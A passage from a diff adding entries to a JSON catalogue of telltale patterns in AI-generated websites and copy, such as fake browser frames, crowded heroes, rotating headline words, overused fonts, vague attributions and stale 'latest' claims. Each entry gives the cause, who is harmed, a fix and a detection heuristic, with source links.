+    "t": "taste-skill/skills/taste-skill/references/motion.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/motion.md"
+   }
+  ],
+  "code": "A111",
+  "rel": [
+   "cursor-spotlight-cards",
+   "the-tilt-card",
+   "the-pulsing-dot"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-fake-browser-frame",
+  "name": "The Fake Browser Frame",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every screenshot is wrapped in a drawn Safari window or phone outline, shrinking the product inside decoration.",
+  "looksLike": "A grey rounded rectangle with three dots and an address bar reading 'acme.com', containing a screenshot too small to read. Mobile screens sit inside a drawn phone with a notch.",
+  "why": "Magic UI ships a Safari browser mockup and phone frames specifically 'to showcase your website', and AI tools reach for them to make placeholder screenshots look finished. Taste-skill tells generators to drop device mock-ups and browser chrome and show a real interface fragment instead.",
+  "who": "Visitors cannot read the product they are being sold, and the frame takes space the interface needed.",
+  "theFix": "Crop to the one part of the interface that makes the point and show it at true size. Drop the window chrome.",
+  "heur": "Flag elements with three small circles plus a URL bar shape, or Safari/iPhone mockup components, wrapping images.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Safari | React Components & Templates",
+    "u": "https://magicui.design/docs/components/safari"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/imagery.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/imagery.md"
+   }
+  ],
+  "code": "A112",
+  "rel": [
+   "the-fake-dashboard",
+   "design-tool-chrome-as-ornament",
+   "the-pseudo-ui-screenshot"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-first-screen-as-dashboard",
+  "name": "The First Screen As Dashboard",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Layout",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "The hero is crowded with pill clusters, stat strips, icon rows and boxed promos all competing at once.",
+  "looksLike": "Above the fold: a headline, a badge, three feature pills, a row of four stats, a strip of icons, a promo box and two buttons. No single thing leads.",
+  "why": "Models try to cover every requirement in the prompt on the first screen. OpenAI's GPT-5.4 guide tells the model the first viewport must read as one composition, not a dashboard, and to avoid pill clusters, stat strips, icon rows and boxed promos.",
+  "who": "Visitors can't find the one sentence that says what the product is, and phones push the action off screen.",
+  "theFix": "Limit the first screen to the brand, one headline, one sentence, one picture and one action. Move everything else further down.",
+  "heur": "Count distinct component groups (pills, stats, icon rows, cards) inside the first viewport; flag 3 or more alongside the headline.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Designing delightful frontends with GPT-5.4 | OpenAI Developers",
+    "u": "https://developers.openai.com/blog/designing-delightful-frontends-with-gpt-5-4"
+   },
+   {
+    "t": "OpenAI publishes a prompting playbook that helps designers get better frontend results from GPT-5.4",
+    "u": "https://the-decoder.com/openai-publishes-a-prompting-playbook-that-helps-designers-get-better-frontend-results-from-gpt-5-4/"
+   }
+  ],
+  "code": "A113",
+  "rel": [
+   "three-identical-feature-cards",
+   "the-inset-hero-card",
+   "centred-hero-one-button"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-inset-hero-card",
+  "name": "The Inset Hero Card",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Layout",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "The hero picture shrinks into a rounded card mid-page instead of owning the screen.",
+  "looksLike": "A centred headline, two buttons, then a rounded-2xl image or screenshot inset with a soft shadow below. Other pictures down the page get the same rounded card treatment.",
+  "why": "Models wrap media in cards by reflex. OpenAI's GPT-5.4 guide explicitly tells the model not to use inset hero images, side-panel hero images or rounded media cards by default, and taste-skill's study found 'centred statement with media below' was the signature hero of weak sites.",
+  "who": "The product or place the page is about becomes a thumbnail, and the first screen loses its focal point.",
+  "theFix": "Make the main picture full-bleed or give it a deliberate crop and position. Keep picture corners square unless the brand system says otherwise.",
+  "heur": "Flag a hero image narrower than about 80% of the viewport with border-radius over 8px and a box-shadow, placed below centred text.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Designing delightful frontends with GPT-5.4 | OpenAI Developers",
+    "u": "https://developers.openai.com/blog/designing-delightful-frontends-with-gpt-5-4"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/research.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/research.md"
+   }
+  ],
+  "code": "A114",
+  "rel": [
+   "the-conveyor-belt-page",
+   "the-first-screen-as-dashboard",
+   "centred-hero-one-button"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-integration-constellation",
+  "name": "The Integration Constellation",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Logos of other apps orbiting or wired by animated beams to your logo in the middle, implying integrations.",
+  "looksLike": "A central product icon with Slack, Notion, GitHub and Google Drive logos around it, joined by glowing lines that pulse toward the centre, or circling on rings. Often no integration is documented anywhere else.",
+  "why": "Magic UI's Animated Beam is described as useful for showcasing integration features, and Orbiting Circles does the same as a ring. Models add the block because 'integrations' is a standard landing section, and fill it with famous logos from memory.",
+  "who": "Buyers infer integrations that may not exist, and the use of third-party logos implies partnerships nobody agreed to.",
+  "theFix": "Show only integrations you ship, with a link to each one's docs. A plain list with real status beats an animated diagram.",
+  "heur": "Flag animated beam or orbit components containing third-party logos; cross-check each logo against an integrations page or docs.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Animated Beam | React Components & Templates",
+    "u": "https://magicui.design/docs/components/animated-beam"
+   },
+   {
+    "t": "Orbiting Circles | React Components & Templates",
+    "u": "https://magicui.design/docs/components/orbiting-circles"
+   },
+   {
+    "t": "Aceternity UI vs Magic UI vs shadcn/ui 2026 — PkgPulse Guides",
+    "u": "https://www.pkgpulse.com/guides/aceternity-ui-vs-magic-ui-vs-shadcn-animated-react-2026"
+   }
+  ],
+  "code": "A115",
+  "rel": [
+   "meteor-shower-backdrop",
+   "gradient-initial-avatars",
+   "the-fake-dashboard"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-link-column-footer",
+  "name": "The Link-Column Footer",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Navigation",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A four-column footer of Product, Company, Resources and Legal links on a site with three real pages.",
+  "looksLike": "Columns of grey links: Features, Pricing, Changelog, About, Careers, Blog, Press, Docs, Privacy, Terms. Half go to '#'. A newsletter box and five social icons sit beside them.",
+  "why": "Models reproduce the footer of large SaaS sites from training data, whatever the site's size. Taste-skill's study found link-column footers mentioned only as criticism, while strong pages ended on a designed scene.",
+  "who": "Visitors hit dead links and can't tell what actually exists, and the page ends on clutter.",
+  "theFix": "List only pages that exist. End with the one contact fact or action that matters, and the legal line.",
+  "heur": "Count footer links and check each resolves; flag footers with 3 or more columns where any link is '#' or 404.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "taste-skill/skills/taste-skill/references/research.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/research.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/layout.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/layout.md"
+   }
+  ],
+  "code": "A116",
+  "rel": [
+   "the-link-that-opens-the-browser",
+   "coming-soon-navigation",
+   "hamburger-in-a-native-app"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-rotating-headline-word",
+  "name": "The Rotating Headline Word",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "'Built for [designers | developers | founders]': one word in the headline flips through a list on a loop.",
+  "looksLike": "The hero sentence has a slot where words slide or flip in every two seconds. The headline never sits still, and its width or line breaks shift as each word changes.",
+  "why": "Word Rotate (Magic UI) and Flip Words (Aceternity) make this a drop-in component. It lets a model avoid choosing one audience, which suits a prompt that named several.",
+  "who": "Readers never see the full headline at once, screen readers may read a fragment, and WCAG 2.2.2 requires a way to pause moving content that lasts more than five seconds.",
+  "theFix": "Pick the one audience the page is for and write it into the headline. List other audiences in plain text below.",
+  "heur": "Flag h1 children with interval-driven text changes or keyframes cycling through a word list.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Word Rotate | React Components & Templates",
+    "u": "https://magicui.design/docs/components/word-rotate"
+   },
+   {
+    "t": "Flip Words | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/flip-words"
+   },
+   {
+    "t": "Understanding Success Criterion 2.2.2: Pause, Stop, Hide | WAI | W3C",
+    "u": "https://www.w3.org/WAI/WCAG22/Understanding/pause-stop-hide.html"
+   }
+  ],
+  "code": "A117",
+  "rel": [
+   "scrambled-headline-reveal",
+   "cursor-on-a-page-you-cant-type-in",
+   "the-spinning-seal"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-second-choice-font",
+  "name": "The Second-Choice Font",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Typography",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Told to avoid Inter, the model picks the next font on its short list, like Space Grotesk or Geist.",
+  "looksLike": "The hero is set in Space Grotesk, Geist, Syne, Outfit, Sora or Fraunces instead of Inter. A serif page lands on Instrument Serif or Playfair. The font changes from project to project, but always from the same small roster, so unrelated products still look related.",
+  "why": "Prompt advice and skills tell models to avoid Inter and Roboto, so they converge on the next most common 'distinctive' choice instead. Anthropic's own cookbook warns that the model still tends to converge on Space Grotesk across generations, and detector projects now list an expanded 2026 default stack.",
+  "who": "Brands that believe they chose a characterful typeface end up with the same voice as hundreds of generated sites.",
+  "theFix": "Pick type from the subject, not from a ban list: name the reason for the face in the brief. Tell the tool to propose three fonts outside its usual roster and explain each, then choose one yourself.",
+  "heur": "Read computed font-family on h1 and body; flag Space Grotesk, Geist, Instrument Serif, Syne, Outfit, Sora, Fraunces or Plus Jakarta Sans when no brand guide names them.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Prompting for frontend aesthetics | Claude Cookbook",
+    "u": "https://platform.claude.com/cookbook/coding-prompting-for-frontend-aesthetics"
+   },
+   {
+    "t": "Scoring Show HN submissions for AI design patterns",
+    "u": "https://www.adriankrebs.ch/blog/design-slop/"
+   },
+   {
+    "t": "slop-detect pattern catalogue API (version 2026.11)",
+    "u": "https://slop-detect.com/api/patterns"
+   }
+  ],
+  "code": "A118",
+  "rel": [
+   "inter-for-everything",
+   "crushed-headline-tracking",
+   "type-scale-soup"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-spinning-globe",
+  "name": "The Spinning Globe",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Performance",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "A rotating WebGL globe with glowing dots, standing in for 'global scale' on a local product.",
+  "looksLike": "A dark section with a dotted Earth turning slowly, arcs flying between cities, under a heading like 'Built for teams everywhere'. It loads a 3D library for one decoration.",
+  "why": "Globe components are packaged in Magic UI and Aceternity, and they are an easy visual answer to a prompt about scale or reach. Guides note the 3D globe pulls in Three.js, which is heavy.",
+  "who": "Phone users pay for the download and battery, and the visual claims a reach the business may not have.",
+  "theFix": "Remove it unless the product is about geography. If location matters, show a real map of real data, rendered statically.",
+  "heur": "Flag a canvas with WebGL context in a marketing section plus imports of cobe, three or a globe component.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Globe | React Components & Templates",
+    "u": "https://magicui.design/docs/components/globe"
+   },
+   {
+    "t": "Aceternity UI vs Magic UI vs shadcn/ui 2026 — PkgPulse Guides",
+    "u": "https://www.pkgpulse.com/guides/aceternity-ui-vs-magic-ui-vs-shadcn-animated-react-2026"
+   }
+  ],
+  "code": "A119",
+  "rel": [
+   "the-megabyte-bundle",
+   "unsized-images-shifting-layout",
+   "animating-layout-properties"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-spinning-seal",
+  "name": "The Spinning Seal",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "A circle of text like 'SCROLL DOWN • SINCE 2024 •' rotating endlessly in a corner of the hero.",
+  "looksLike": "A round badge of uppercase text set on a circular path, turning slowly beside the headline or over an image, sometimes with an arrow in the middle.",
+  "why": "Spinning Text is a packaged Magic UI component, and the device was borrowed from agency portfolios. Taste-skill lists rotating badges among the infinite loops that give generated motion away.",
+  "who": "The badge adds motion and tiny text that carries no information, and it is often unreadable as it turns.",
+  "theFix": "Remove it. If the text matters, write it as a normal line on the page.",
+  "heur": "Flag text on an SVG textPath or circularly placed spans inside an element with an infinite rotate animation.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Spinning Text | React Components & Templates",
+    "u": "https://magicui.design/docs/components/spinning-text"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/motion.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/motion.md"
+   }
+  ],
+  "code": "A120",
+  "rel": [
+   "fade-up-on-everything",
+   "cursor-on-a-page-you-cant-type-in",
+   "light-running-round-the-border"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-tilt-card",
+  "name": "The Tilt Card",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "Motion",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "Cards that rotate in 3D toward the cursor as you move over them, with layers floating at different depths.",
+  "looksLike": "Hover a pricing or feature card and it tips toward the pointer, its icon and title lifting off the surface. Several cards do it at once as the mouse crosses the grid.",
+  "why": "Aceternity's 3D Card Effect makes it a copy-paste component that is easy to apply to every card in a grid. One comparison guide notes the same 3D card flips and spotlight effects repeat across dozens of products on Product Hunt.",
+  "who": "Motion-sensitive visitors get unexpected movement from a simple pointer pass, which WCAG 2.3.3 asks sites to let users turn off.",
+  "theFix": "Keep cards still. If depth matters, use one deliberate effect on one element and switch it off under prefers-reduced-motion.",
+  "heur": "Flag perspective plus rotateX/rotateY transforms updated on mousemove for card elements, and check for a reduced-motion rule.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "3D Card Hover Tilt Effect for React | Aceternity UI",
+    "u": "https://ui.aceternity.com/components/3d-card-effect"
+   },
+   {
+    "t": "Aceternity UI vs Magic UI vs shadcn/ui 2026 — PkgPulse Guides",
+    "u": "https://www.pkgpulse.com/guides/aceternity-ui-vs-magic-ui-vs-shadcn-animated-react-2026"
+   },
+   {
+    "t": "Understanding Success Criterion 2.3.3: Animation from Interactions | WAI | W3C",
+    "u": "https://www.w3.org/WAI/WCAG22/Understanding/animation-from-interactions.html"
+   }
+  ],
+  "code": "A121",
+  "rel": [
+   "cursor-spotlight-cards",
+   "fade-up-on-everything",
+   "the-pulsing-dot"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "type-scale-soup",
+  "name": "Type Scale Soup",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Typography",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Nine or more font sizes on one page, most of them a step apart, so nothing is clearly bigger.",
+  "looksLike": "text-sm, text-base, text-lg, text-xl, text-2xl, text-3xl all in use, plus a few arbitrary pixel values. Headings, sublabels and captions differ by two pixels. The page has many sizes and no hierarchy.",
+  "why": "Models pick a Tailwind size class per element as they write it, without a planned scale, so every component gets its own step. Taste-skill's study found strong sites push size extremes while weak ones cluster in the middle, and its linter warns past nine sizes.",
+  "who": "Readers cannot tell what to read first, and the design is hard to maintain because no scale exists.",
+  "theFix": "Ask the tool to define five type sizes far apart as tokens and use only those. Replace in-between sizes with weight or space.",
+  "heur": "Count distinct computed font-size values on rendered text; flag 9 or more, or many pairs within 2px of each other.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "taste-skill/skills/taste-skill/references/tells.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/tells.md"
+   },
+   {
+    "t": "taste-skill/skills/taste-skill/references/research.md at main · Leonxlnx/taste-skill",
+    "u": "https://github.com/Leonxlnx/taste-skill/blob/main/skills/taste-skill/references/research.md"
+   }
+  ],
+  "code": "A122",
+  "rel": [
+   "flat-type-hierarchy",
+   "small-body-text",
+   "monospace-as-costume"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "white-scrollbar-in-the-dark",
+  "name": "White Scrollbar In The Dark",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Colour",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "A dark-themed page whose scrollbars, date pickers and form controls stay bright white.",
+  "looksLike": "A black page with a glaring light-grey scrollbar down the side. Select menus open white, checkboxes and date inputs keep light-mode styling, and autofill paints fields pale yellow.",
+  "why": "Generated dark themes set background and text colours with utility classes but rarely declare color-scheme: dark, which is what tells the browser to theme its own controls. Detector catalogues now check for this on dark pages.",
+  "who": "Users get flashes of white in the dark, and native controls can become low-contrast against the custom theme.",
+  "theFix": "Declare color-scheme: dark (or 'light dark' with a toggle) on the root, and test native inputs and scrollbars in each theme.",
+  "heur": "On pages with a dark computed body background, flag a missing color-scheme declaration and a missing meta name='color-scheme'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "color-scheme CSS property - CSS | MDN",
+    "u": "https://developer.mozilla.org/en-US/docs/Web/CSS/color-scheme"
+   },
+   {
+    "t": "slop-detect pattern catalogue API (version 2026.11)",
+    "u": "https://slop-detect.com/api/patterns"
+   }
+  ],
+  "code": "A123",
+  "rel": [
+   "half-dark-mode",
+   "neon-glow-on-everything",
+   "reflex-cream"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "additionally-moreover",
+  "name": "Additionally, Moreover",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Feature blurbs and FAQ answers chain sentences with 'Additionally', 'Moreover' and 'Furthermore'.",
+  "looksLike": "An FAQ answer reads 'Yes, we support exports. Additionally, you can schedule them. Furthermore, all exports are encrypted. Moreover, our team is happy to help.' The connectives claim a logical link the sentences do not have. Product copy reads like an essay.",
+  "why": "Sentence-initial 'Additionally' is on the list of words whose frequency jumped once LLMs became common, and research on excess vocabulary links that jump to model output. The formal connective is a default way for a model to join independent points.",
+  "who": "Short interface and help copy gets longer and stiffer, and the key fact is buried behind filler.",
+  "theFix": "Delete the connective and check the sentence still stands. Usually it does. Put independent points in a short list instead.",
+  "heur": "Count sentence-initial /^(additionally|moreover|furthermore|in addition),/i in visible copy; flag 3+ per page or any in UI microcopy.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Why Does ChatGPT \"Delve\" So Much? Exploring the Sources of Lexical Overrepresentation in Large Language Models",
+    "u": "https://arxiv.org/abs/2412.11385"
+   },
+   {
+    "t": "Formal transition crutch",
+    "u": "https://feedsquad.com/ai-tells/formal-transition-crutch"
+   }
+  ],
+  "code": "A124",
+  "rel": [
+   "the-ensuring-tail",
+   "emoji-bullets",
+   "leftover-lorem"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "arrows-and-curly-quotes",
+  "name": "Arrows And Curly Quotes",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Copy is studded with characters nobody types: arrows, curly quotes and apostrophes, mixed with straight ones.",
+  "looksLike": "Feature lists read 'Upload → Analyse → Share'. A page mixes curly and straight apostrophes in the same paragraph, because some text was pasted from a chat window and some was typed. The mismatch is visible in the source and sometimes in the font.",
+  "why": "Wikipedia notes ChatGPT and DeepSeek typically output curly quotes and apostrophes, sometimes inconsistently, while Gemini and Claude usually do not. The Tropes directory notes heavy use of Unicode arrows in model output.",
+  "who": "Most readers will not consciously notice, but inconsistent punctuation looks careless and can break search, copy-paste and code snippets on the page.",
+  "theFix": "Pick one quote style for the site and normalise all copy to it. Replace arrow chains with real sentences or a proper numbered list.",
+  "heur": "In visible text, flag pages containing both ' and ’ (or \" and “), and count → characters outside diagrams.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Unicode decoration - Tropes",
+    "u": "https://tropes.fyi/tropes/unicode-decoration"
+   },
+   {
+    "t": "Curly quotes in plain-text registers",
+    "u": "https://feedsquad.com/ai-tells/curly-quotes-in-plain-text"
+   }
+  ],
+  "code": "A125",
+  "rel": [
+   "we-ve-all-been-there",
+   "placeholder-testimonials",
+   "emoji-bullets"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "despite-these-challenges",
+  "name": "Despite These Challenges",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Content",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Company stories and posts end with vague 'challenges' followed by a vague promise they will be overcome.",
+  "looksLike": "An About page or company blog closes with 'Despite the challenges of a crowded market, we remain committed to...' and 'The future looks bright as we continue to innovate.' Neither beat names a real obstacle, date or plan.",
+  "why": "Wikipedia editors found LLM-written articles so often end with a 'Challenges' then 'Future Outlook' paragraph that they gave it its own shortcut. The two-beat shape is a safe, balanced way for a model to end anything.",
+  "who": "Readers get a closing paragraph that cannot be wrong and therefore tells them nothing, and it signals the page was not written by people who know the business.",
+  "theFix": "End on something concrete: the next release and its date, a real constraint you are working on, or what the reader should do now.",
+  "heur": "Regex for /\\bdespite (these|the|its|our) [\\w\\s]{0,30}challenges\\b|\\bthe future (looks|remains) (bright|promising)\\b/i in the last two paragraphs.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "The challenges-then-outlook closer",
+    "u": "https://feedsquad.com/ai-tells/challenges-then-future-outlook-closer"
+   },
+   {
+    "t": "\"Despite its challenges...\" - Tropes",
+    "u": "https://tropes.fyi/tropes/despite-challenges"
+   }
+  ],
+  "code": "A126",
+  "rel": [
+   "let-s-dive-in",
+   "zombie-domain-newsroom",
+   "summary-eats-the-source"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "enables-the-optimization-of",
+  "name": "Enables The Optimization Of",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Feature copy turns verbs into abstract nouns, 'enables the optimization of workflow management', and drops who does what.",
+  "looksLike": "'Facilitates the streamlining of collaboration.' 'Provides enhanced visibility into performance optimization.' A weak verb like 'enables' or 'provides' carries a pile of -tion and -ment nouns. Nobody in the sentence does anything.",
+  "why": "Reinhart and colleagues found GPT-4o used nominalizations about twice as often as human writers. The nominal style sounds professional and avoids committing to an actor or an action.",
+  "who": "Readers have to translate the sentence back into an action to understand it, and many give up.",
+  "theFix": "Name the actor and use the verb: 'You see every late order on one screen.' Tell the AI: 'Use active verbs. Say who does what.'",
+  "heur": "Count words ending in -tion, -ment, -ance, -ity after enables|provides|facilitates|offers within a sentence; flag feature blurbs with 2+.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Do LLMs write like humans? Variation in grammatical and rhetorical styles",
+    "u": "https://arxiv.org/abs/2410.16107"
+   },
+   {
+    "t": "Nominalization overload",
+    "u": "https://feedsquad.com/ai-tells/nominalization-overload"
+   }
+  ],
+  "code": "A127",
+  "rel": [
+   "think-of-it-as",
+   "placeholder-testimonials",
+   "leftover-lorem"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "experts-agree",
+  "name": "Experts Agree",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Claims lean on unnamed authorities: 'Experts agree', 'Studies show', 'Industry reports suggest'.",
+  "looksLike": "'Studies show that teams using automation are 3x more productive.' 'Experts agree that personalisation is the future.' 'Industry leaders trust our approach.' No study, expert or report is named or linked anywhere on the page.",
+  "why": "Models imitate the shape of an evidence-backed claim without having evidence to attach. Wikipedia files this as vague attribution and notes chatbots also inflate one source into 'several reports'.",
+  "who": "Careful buyers cannot check the claim, and the ones who notice read it as a sign the rest of the copy is invented too.",
+  "theFix": "Name the source and link it, with its date and sample. If there is no source, delete the claim or replace it with something you measured yourself.",
+  "heur": "Regex for /\\b(studies (show|suggest)|experts (agree|say|argue)|research (shows|suggests)|industry (reports|leaders|experts))\\b/i; flag when no link or citation appears in the same block.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Vague attribution",
+    "u": "https://feedsquad.com/ai-tells/vague-attribution"
+   },
+   {
+    "t": "Phrases That Instantly Make Writing Sound AI-Generated",
+    "u": "https://www.ultimatewb.com/blog/8275/phrases-that-instantly-make-writing-sound-ai-generated/"
+   }
+  ],
+  "code": "A128",
+  "rel": [
+   "the-ensuring-tail",
+   "we-ve-all-been-there",
+   "the-weightless-headline"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "frozen-at-the-cutoff",
+  "name": "Frozen At The Cutoff",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Content",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Copy calls an old model, price or year 'the latest', because it was true at training time.",
+  "looksLike": "A comparison page says 'powered by the latest GPT-4 model' long after it was replaced. A guide says 'as of 2024' on a page published in 2026, or lists 'this year's best tools' from two years ago. None of it carries an as-of date.",
+  "why": "A model writes from its training data, which ends at a cutoff, and states what it knew then in the present tense. Wikipedia documents knowledge-cutoff statements as a sign of AI text, and catalogues list stale facts stated as current.",
+  "who": "Readers act on outdated prices, versions and limits, and anyone who knows the field sees the page is stale at a glance.",
+  "theFix": "Put an as-of date or a link to the live source next to every changing fact: prices, versions, model names, limits. Ask the AI to mark any time-sensitive claim for human checking.",
+  "heur": "Regex for /\\b(the latest|newest|current) (version|model|release)\\b|\\bas of (20\\d\\d)\\b/i and flag years at least one year before the page's publish date.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Stale fact stated as current",
+    "u": "https://feedsquad.com/ai-tells/stale-fact-as-current"
+   },
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   }
+  ],
+  "code": "A129",
+  "rel": [
+   "refusal-text-goes-live",
+   "zombie-domain-newsroom",
+   "machine-translated-everything"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell catalogues and Wikipedia editors report AI text that dates itself to a training window or states old versions and prices as current.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "it-depends-on-your-needs",
+  "name": "It Depends On Your Needs",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Content",
+  "harm": "Productivity",
+  "origin": "Model",
